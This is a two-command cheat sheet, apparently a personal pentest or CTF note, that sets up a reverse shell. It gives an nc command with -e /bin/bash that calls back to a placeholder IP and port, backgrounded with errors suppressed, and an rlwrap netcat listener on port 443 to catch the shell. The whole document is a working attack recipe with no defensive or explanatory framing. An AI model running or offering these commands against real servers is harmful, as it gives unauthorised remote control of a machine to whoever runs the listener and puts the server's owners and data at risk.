# creating reverse shell on server
nc IP PORT -e /bin/bash 2 > /dev/null &

# listen to https port (netcat on mac otherwise nc)
rlwrap netcat -nvlp 443
